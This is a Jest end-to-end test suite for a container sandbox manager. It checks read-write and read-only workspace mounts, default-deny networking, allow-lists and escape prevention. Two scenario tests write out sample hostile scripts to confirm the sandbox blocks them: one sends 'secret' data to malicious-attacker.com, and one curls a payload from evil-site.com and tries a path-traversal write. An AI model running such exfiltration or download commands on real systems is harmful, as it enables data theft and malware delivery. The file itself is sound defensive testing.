const fs = require('fs');
const path = require('path');
const os = require('os');
const { IsolatedWorkspaceManager } = require('../../src/IsolatedWorkspaceManager');

jest.setTimeout(180000);

describe('IsolatedWorkspaceManager E2E Test Suite', () => {
  let containersToCleanup = [];
  let dirsToCleanup = [];

  function createTempDir() {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sandbox-test-'));
    dirsToCleanup.push(dir);
    return dir;
  }

  function registerContainer(container) {
    if (container) {
      containersToCleanup.push(container);
    }
    return container;
  }

  afterEach(async () => {
    // Stop all registered containers
    for (const container of containersToCleanup) {
      try {
        await container.stop();
      } catch (e) {
        // Suppress errors during cleanup so other containers/directories can still be cleaned up
      }
    }
    containersToCleanup = [];

    // Delete all temporary directories
    for (const dir of dirsToCleanup) {
      try {
        fs.rmSync(dir, { recursive: true, force: true });
      } catch (e) {
        // Suppress errors during cleanup
      }
    }
    dirsToCleanup = [];
  });

  // ==========================================
  // TIER 1: Feature Coverage (Feature-by-Feature)
  // ==========================================

  // Feature 1: Sandbox A (Read-Write Workspace)
  test('shouldWriteNewFileInSandboxA', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['sh', '-c', 'echo "hello" > /workspace/newfile.txt']);
    expect(result.exitCode).toBe(0);
    
    const hostFileContent = fs.readFileSync(path.join(workspaceDir, 'newfile.txt'), 'utf8');
    expect(hostFileContent.trim()).toBe('hello');
  });

  test('shouldReadExistingFileInSandboxA', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'existing.txt'), 'hello from host');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['cat', '/workspace/existing.txt']);
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe('hello from host');
  });

  test('shouldModifyExistingFileInSandboxA', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'modify.txt'), 'original');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['sh', '-c', 'echo " appended" >> /workspace/modify.txt']);
    expect(result.exitCode).toBe(0);
    
    const hostFileContent = fs.readFileSync(path.join(workspaceDir, 'modify.txt'), 'utf8');
    expect(hostFileContent.trim()).toBe('original appended');
  });

  test('shouldDeleteFileInSandboxA', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'delete.txt'), 'to be deleted');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['rm', '/workspace/delete.txt']);
    expect(result.exitCode).toBe(0);
    
    expect(fs.existsSync(path.join(workspaceDir, 'delete.txt'))).toBe(false);
  });

  test('shouldCreateDirectoryInSandboxA', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['mkdir', '/workspace/subdir']);
    expect(result.exitCode).toBe(0);
    
    expect(fs.statSync(path.join(workspaceDir, 'subdir')).isDirectory()).toBe(true);
  });

  test('shouldChangePermissionsInSandboxA', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'perms.txt'), 'content');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['chmod', '+x', '/workspace/perms.txt']);
    expect(result.exitCode).toBe(0);
    
    const stats = fs.statSync(path.join(workspaceDir, 'perms.txt'));
    expect((stats.mode & 0o111) !== 0).toBe(true);
  });

  // Feature 2: Sandbox B (Read-Only Workspace & Write Failures)
  test('shouldReadExistingFileInSandboxB', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'read.txt'), 'read-only data');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['cat', '/workspace/read.txt']);
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe('read-only data');
  });

  test('shouldFailToWriteNewFileInSandboxB', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['touch', '/workspace/newfile.txt']);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Read-only file system');
  });

  test('shouldFailToModifyFileInSandboxB', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'modify.txt'), 'original');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['sh', '-c', 'echo "append" >> /workspace/modify.txt']);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Read-only file system');
  });

  test('shouldFailToDeleteFileInSandboxB', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'delete.txt'), 'content');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['rm', '/workspace/delete.txt']);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Read-only file system');
  });

  test('shouldFailToCreateDirectoryInSandboxB', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['mkdir', '/workspace/subdir']);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Read-only file system');
  });

  test('shouldFailToChangePermissionsInSandboxB', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'perms.txt'), 'content');
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['chmod', '+x', '/workspace/perms.txt']);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Read-only file system');
  });

  // Feature 3: Network Isolation (Default-Deny)
  test('shouldBlockExternalHttpTrafficByDefault', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['curl', '-I', '--connect-timeout', '3', 'https://example.com']);
    expect(result.exitCode).not.toBe(0);
  });

  test('shouldBlockExternalHttpTrafficWithEmptyAllowList', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir, allowList: [] }));
    
    const result = await container.exec(['curl', '-I', '--connect-timeout', '3', 'https://example.com']);
    expect(result.exitCode).not.toBe(0);
  });

  test('shouldVerifyNoneNetworkModeInContainer', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['ip', 'addr']);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('lo');
    const interfaces = result.stdout.split('\n')
      .filter(line => line.match(/^\d+:/))
      .filter(line => !line.includes('@NONE') && !line.includes('sit0') && !line.includes('tunl0') && !line.includes('gre0'));
    expect(interfaces.length).toBe(1);
  });

  test('shouldFailDnsResolutionInIsolatedNetwork', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['getent', 'hosts', 'google.com']);
    expect(result.exitCode).not.toBe(0);
  });

  test('shouldBlockRawTcpConnection', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['nc', '-z', '-w', '2', '8.8.8.8', '53']);
    expect(result.exitCode).not.toBe(0);
  });

  test('shouldHaveNoDefaultGatewayInRoutingTable', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['ip', 'route']);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).not.toContain('default');
  });

  // ==========================================
  // TIER 2: Boundary & Corner Cases
  // ==========================================

  // Feature 1: Sandbox A Boundaries
  test('shouldProvisionSandboxAWithEmptyWorkspaceDir', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['ls', '-la', '/workspace']);
    expect(result.exitCode).toBe(0);
    const lines = result.stdout.split('\n').map(l => l.trim()).filter(Boolean);
    const contents = lines.filter(l => !l.endsWith('.') && !l.endsWith('..') && !l.startsWith('total'));
    expect(contents.length).toBe(0);
  });

  test('shouldCreateNonexistentWorkspaceDirOnHost', async () => {
    const baseDir = createTempDir();
    const workspaceDir = path.join(baseDir, 'nonexistent-subdir');
    
    expect(fs.existsSync(workspaceDir)).toBe(false);
    
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    expect(fs.existsSync(workspaceDir)).toBe(true);
    expect(fs.statSync(workspaceDir).isDirectory()).toBe(true);
  });

  test('shouldPreventAccessToOutsideWorkspaceViaSymlinks', async () => {
    const workspaceDir = createTempDir();
    const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sandbox-outside-'));
    const outsideFile = path.join(outsideDir, 'secret.txt');
    fs.writeFileSync(outsideFile, 'secret-data');
    
    const symlinkPath = path.join(workspaceDir, 'leak-link');
    fs.symlinkSync(outsideFile, symlinkPath);
    
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['cat', '/workspace/leak-link']);
    expect(result.exitCode).not.toBe(0);
    
    fs.rmSync(outsideDir, { recursive: true, force: true });
  });

  test('shouldHandleUnicodeAndSpecialCharactersInPaths', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const specialName = '日本語_🔥_space test.txt';
    const result = await container.exec(['sh', '-c', `echo "unicode content" > "/workspace/${specialName}"`]);
    expect(result.exitCode).toBe(0);
    
    const hostFile = path.join(workspaceDir, specialName);
    expect(fs.existsSync(hostFile)).toBe(true);
    expect(fs.readFileSync(hostFile, 'utf8').trim()).toBe('unicode content');
  });

  test('shouldHandleLargeFilesSucceeds', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['dd', 'if=/dev/zero', 'of=/workspace/large.bin', 'bs=1M', 'count=50']);
    expect(result.exitCode).toBe(0);
    
    const hostFilePath = path.join(workspaceDir, 'large.bin');
    expect(fs.existsSync(hostFilePath)).toBe(true);
    expect(fs.statSync(hostFilePath).size).toBe(50 * 1024 * 1024);
  });

  test('shouldProvisionAndStopMultipleContainersConcurrently', async () => {
    const manager = new IsolatedWorkspaceManager();
    const dirs = [createTempDir(), createTempDir(), createTempDir()];
    
    const promises = dirs.map(dir => manager.createSandboxA({ workspaceDir: dir }));
    const containers = await Promise.all(promises);
    containers.forEach(c => registerContainer(c));
    
    const writePromises = containers.map((c, i) => c.exec(['sh', '-c', `echo "container${i}" > /workspace/identity.txt`]));
    const results = await Promise.all(writePromises);
    results.forEach(r => expect(r.exitCode).toBe(0));
    
    dirs.forEach((dir, i) => {
      expect(fs.readFileSync(path.join(dir, 'identity.txt'), 'utf8').trim()).toBe(`container${i}`);
    });
    
    const stopPromises = containers.map(c => c.stop());
    await Promise.all(stopPromises);
  });

  // Feature 2: Sandbox B Boundaries
  test('shouldWriteToTmpDirectoryInSandboxB', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['touch', '/tmp/scratch.txt']);
    expect(result.exitCode).toBe(0);
    
    const resultWorkspace = await container.exec(['touch', '/workspace/scratch.txt']);
    expect(resultWorkspace.exitCode).not.toBe(0);
  });

  test('shouldProvisionSandboxBWithEmptyWorkspaceDir', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['ls', '-la', '/workspace']);
    expect(result.exitCode).toBe(0);
    const lines = result.stdout.split('\n').map(l => l.trim()).filter(Boolean);
    const contents = lines.filter(l => !l.endsWith('.') && !l.endsWith('..') && !l.startsWith('total'));
    expect(contents.length).toBe(0);
  });

  test('shouldHandleNonexistentWorkspaceDirForSandboxB', async () => {
    const baseDir = createTempDir();
    const workspaceDir = path.join(baseDir, 'nonexistent-ro');
    
    expect(fs.existsSync(workspaceDir)).toBe(false);
    
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    expect(fs.existsSync(workspaceDir)).toBe(true);
  });

  test('shouldPreventTraversalOutsideMountInSandboxB', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['touch', '/workspace/../foo.txt']);
    expect(result.exitCode).not.toBe(0);
  });

  test('shouldReadDiskUsageInSandboxB', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const result = await container.exec(['df', '-h', '/workspace']);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('/workspace');
  });

  test('shouldSupportMultipleConcurrentReadsInSandboxB', async () => {
    const workspaceDir = createTempDir();
    for (let i = 0; i < 50; i++) {
      fs.writeFileSync(path.join(workspaceDir, `file_${i}.txt`), `data_${i}`);
    }
    
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const readPromises = [];
    for (let i = 0; i < 50; i++) {
      readPromises.push(container.exec(['cat', `/workspace/file_${i}.txt`]));
    }
    
    const results = await Promise.all(readPromises);
    results.forEach((r, i) => {
      expect(r.exitCode).toBe(0);
      expect(r.stdout.trim()).toBe(`data_${i}`);
    });
  });

  // Feature 3: Network Isolation Boundaries
  test('shouldAllowLocalhostLoopbackAccess', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['sh', '-c', 'node -e "require(\\\"http\\\").createServer((req, res) => res.end(\\\"hello\\\")).listen(8080, \\\"127.0.0.1\\\")" & PID=$!; sleep 2; curl -s http://127.0.0.1:8080; kill $PID']);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('hello');
  });

  test('shouldRejectMalformedDomainsInAllowList', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    await expect(manager.createSandboxA({
      workspaceDir,
      allowList: ['http://bad-format', '!!!']
    })).rejects.toThrow();
  });

  test('shouldAllowSpecificIpAddressesOnly', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({
      workspaceDir,
      allowList: ['1.1.1.1']
    }));
    
    const resultSuccess = await container.exec(['nc', '-z', '-w', '3', '1.1.1.1', '53']);
    expect(resultSuccess.exitCode).toBe(0);
    
    const resultFail = await container.exec(['nc', '-z', '-w', '3', '8.8.8.8', '53']);
    expect(resultFail.exitCode).not.toBe(0);
  });

  test('shouldAllowSpecificDomainNamesOnly', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({
      workspaceDir,
      allowList: ['api.github.com']
    }));
    
    let resultSuccess;
    for (let i = 0; i < 3; i++) {
      resultSuccess = await container.exec(['curl', '-I', '--connect-timeout', '5', 'https://api.github.com']);
      if (resultSuccess.exitCode === 0) break;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    expect(resultSuccess.exitCode).toBe(0);
    
    const resultFail = await container.exec(['curl', '-I', '--connect-timeout', '3', 'https://google.com']);
    expect(resultFail.exitCode).not.toBe(0);
  });

  test('shouldPreventNetworkPrivilegeEscalation', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const result = await container.exec(['ip', 'link', 'set', 'dev', 'lo', 'down']);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Operation not permitted');
  });

  test('shouldHandleHugeAllowList', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    const allowList = [];
    for (let i = 0; i < 500; i++) {
      allowList.push(`domain${i}.com`);
    }
    
    const container = registerContainer(await manager.createSandboxA({
      workspaceDir,
      allowList
    }));
    
    expect(container.id).toBeDefined();
  });

  // ==========================================
  // TIER 3: Cross-Feature Combinations (Pairwise)
  // ==========================================

  test('shouldShareWorkspaceStateBetweenSandboxAAndBConcurrently', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    const containerA = registerContainer(await manager.createSandboxA({ workspaceDir }));
    const containerB = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const writeRes = await containerA.exec(['sh', '-c', 'echo "shared content" > /workspace/shared.txt']);
    expect(writeRes.exitCode).toBe(0);
    
    const readRes = await containerB.exec(['cat', '/workspace/shared.txt']);
    expect(readRes.exitCode).toBe(0);
    expect(readRes.stdout.trim()).toBe('shared content');
    
    const writeResB = await containerB.exec(['sh', '-c', 'echo "b-write" > /workspace/shared.txt']);
    expect(writeResB.exitCode).not.toBe(0);
  });

  test('shouldBlockNetworkAndBlockWriteForSandboxB', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const writeRes = await container.exec(['touch', '/workspace/test.txt']);
    expect(writeRes.exitCode).not.toBe(0);
    
    const netRes = await container.exec(['curl', '-I', '--connect-timeout', '3', 'https://example.com']);
    expect(netRes.exitCode).not.toBe(0);
  });

  test('shouldWriteSuccessfullyWithIsolatedNetworkForSandboxA', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const writeRes = await container.exec(['sh', '-c', 'echo "net-isolated-write" > /workspace/file.txt']);
    expect(writeRes.exitCode).toBe(0);
    
    const netRes = await container.exec(['curl', '-I', '--connect-timeout', '3', 'https://example.com']);
    expect(netRes.exitCode).not.toBe(0);
  });

  test('shouldMaintainDataIntegrityUnderConcurrentAWriteAndBRead', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'data.txt'), 'initial');
    
    const manager = new IsolatedWorkspaceManager();
    const containerA = registerContainer(await manager.createSandboxA({ workspaceDir }));
    const containerB = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const writer = async () => {
      for (let i = 0; i < 20; i++) {
        await containerA.exec(['sh', '-c', `echo "write_${i}" > /workspace/data.txt`]);
      }
    };
    
    const reader = async () => {
      for (let i = 0; i < 20; i++) {
        const res = await containerB.exec(['cat', '/workspace/data.txt']);
        expect(res.exitCode).toBe(0);
        expect(res.stdout.trim()).toMatch(/^write_\d+$|^initial$|^$/);
      }
    };
    
    await Promise.all([writer(), reader()]);
  });

  test('shouldEnforceIndependentNetworkPoliciesForConcurrentlyRunningSandboxes', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    const containerA1 = registerContainer(await manager.createSandboxA({
      workspaceDir,
      allowList: ['api.github.com']
    }));
    
    const containerA2 = registerContainer(await manager.createSandboxA({
      workspaceDir
    }));
    
    let res1;
    for (let i = 0; i < 3; i++) {
      res1 = await containerA1.exec(['curl', '-I', '--connect-timeout', '5', 'https://api.github.com']);
      if (res1.exitCode === 0) break;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    expect(res1.exitCode).toBe(0);
    
    const res2 = await containerA2.exec(['curl', '-I', '--connect-timeout', '3', 'https://api.github.com']);
    expect(res2.exitCode).not.toBe(0);
  });

  // ==========================================
  // TIER 4: Real-World Application Scenarios
  // ==========================================

  test('scenarioCodeExecutionSandbox', async () => {
    const workspaceDir = createTempDir();
    const maliciousScript = `
      const fs = require('fs');
      try {
        fs.writeFileSync('/workspace/tampered.js', 'console.log("hacked")');
      } catch(e) {}
      
      const http = require('https');
      const req = http.request('https://malicious-attacker.com/leak?data=secret', () => {});
      req.on('error', () => {});
      req.end();
    `;
    fs.writeFileSync(path.join(workspaceDir, 'payload.js'), maliciousScript);
    
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    await container.exec(['node', '/workspace/payload.js']);
    
    expect(fs.existsSync(path.join(workspaceDir, 'tampered.js'))).toBe(false);
    
    const netCheck = await container.exec(['curl', '-I', '--connect-timeout', '3', 'https://malicious-attacker.com']);
    expect(netCheck.exitCode).not.toBe(0);
  });

  test('scenarioSecureBuildAndTest', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    const containerA = registerContainer(await manager.createSandboxA({
      workspaceDir,
      allowList: ['registry.npmjs.org']
    }));
    
    const buildResult = await containerA.exec(['sh', '-c', 'mkdir -p /workspace/dist && echo "built artifact" > /workspace/dist/app.js']);
    expect(buildResult.exitCode).toBe(0);
    
    const registryCheck = await containerA.exec(['curl', '-I', '--connect-timeout', '3', 'https://registry.npmjs.org']);
    expect(registryCheck.exitCode).toBe(0);
    
    await containerA.stop();
    
    const containerB = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const readArtifact = await containerB.exec(['cat', '/workspace/dist/app.js']);
    expect(readArtifact.exitCode).toBe(0);
    expect(readArtifact.stdout.trim()).toBe('built artifact');
    
    const attemptWrite = await containerB.exec(['sh', '-c', 'echo "corrupted" > /workspace/dist/app.js']);
    expect(attemptWrite.exitCode).not.toBe(0);
    
    const netCheck = await containerB.exec(['curl', '-I', '--connect-timeout', '3', 'https://registry.npmjs.org']);
    expect(netCheck.exitCode).not.toBe(0);
  });

  test('scenarioDatabaseMigrationVerification', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    const containerA = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const migrationRes = await containerA.exec(['sh', '-c', 'sqlite3 /workspace/app.db "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT); INSERT INTO users (name) VALUES (\'Alice\');"']);
    expect(migrationRes.exitCode).toBe(0);
    await containerA.stop();
    
    const containerB = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const queryRes = await containerB.exec(['sqlite3', '/workspace/app.db', 'SELECT name FROM users;']);
    expect(queryRes.exitCode).toBe(0);
    expect(queryRes.stdout.trim()).toBe('Alice');
    
    const attemptInsert = await containerB.exec(['sqlite3', '/workspace/app.db', "INSERT INTO users (name) VALUES ('Bob');"]);
    expect(attemptInsert.exitCode).not.toBe(0);
    expect(attemptInsert.stderr).toContain('readonly');
  });

  test('scenarioMalwareAnalysisSandbox', async () => {
    const workspaceDir = createTempDir();
    fs.writeFileSync(path.join(workspaceDir, 'malware.sh'), `
      touch /workspace/../malicious-leak.txt
      curl -o /tmp/payload.exe https://evil-site.com/payload.exe
      ping -c 1 192.168.1.1
    `);
    
    const manager = new IsolatedWorkspaceManager();
    const container = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    await container.exec(['sh', '/workspace/malware.sh']);
    
    expect(fs.existsSync(path.join(workspaceDir, 'malicious-leak.txt'))).toBe(false);
    expect(fs.existsSync(path.join(workspaceDir, 'payload.exe'))).toBe(false);
    
    const dnsCheck = await container.exec(['getent', 'hosts', 'evil-site.com']);
    expect(dnsCheck.exitCode).not.toBe(0);
  });

  test('scenarioStaticSiteGenerator', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    const containerA = registerContainer(await manager.createSandboxA({
      workspaceDir,
      allowList: ['cdn.contentful.com']
    }));
    
    const genResult = await containerA.exec(['sh', '-c', 'mkdir -p /workspace/public && echo "<h1>Welcome</h1>" > /workspace/public/index.html']);
    expect(genResult.exitCode).toBe(0);
    await containerA.stop();
    
    const containerB = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const serverRes = await containerB.exec(['sh', '-c', 'python3 -m http.server 8000 --directory /workspace/public & PID=$!; for i in $(seq 1 10); do nc -z -w 1 127.0.0.1 8000 && break; sleep 0.5; done; curl -s http://127.0.0.1:8000/; kill $PID']);
    expect(serverRes.exitCode).toBe(0);
    expect(serverRes.stdout).toContain('Welcome');
    
    const editResult = await containerB.exec(['sh', '-c', 'echo "hacked" > /workspace/public/index.html']);
    expect(editResult.exitCode).not.toBe(0);
  });

  test('scenarioCollaborativeEditing', async () => {
    const workspaceDir = createTempDir();
    const manager = new IsolatedWorkspaceManager();
    
    const containerA1 = registerContainer(await manager.createSandboxA({ workspaceDir }));
    const containerA2 = registerContainer(await manager.createSandboxA({ workspaceDir }));
    
    const containerB = registerContainer(await manager.createSandboxB({ workspaceDir }));
    
    const write1 = await containerA1.exec(['sh', '-c', 'echo "doc1-content" > /workspace/doc1.txt']);
    const write2 = await containerA2.exec(['sh', '-c', 'echo "doc2-content" > /workspace/doc2.txt']);
    expect(write1.exitCode).toBe(0);
    expect(write2.exitCode).toBe(0);
    
    const read1 = await containerB.exec(['cat', '/workspace/doc1.txt']);
    const read2 = await containerB.exec(['cat', '/workspace/doc2.txt']);
    expect(read1.exitCode).toBe(0);
    expect(read2.exitCode).toBe(0);
    expect(read1.stdout.trim()).toBe('doc1-content');
    expect(read2.stdout.trim()).toBe('doc2-content');
  });
});
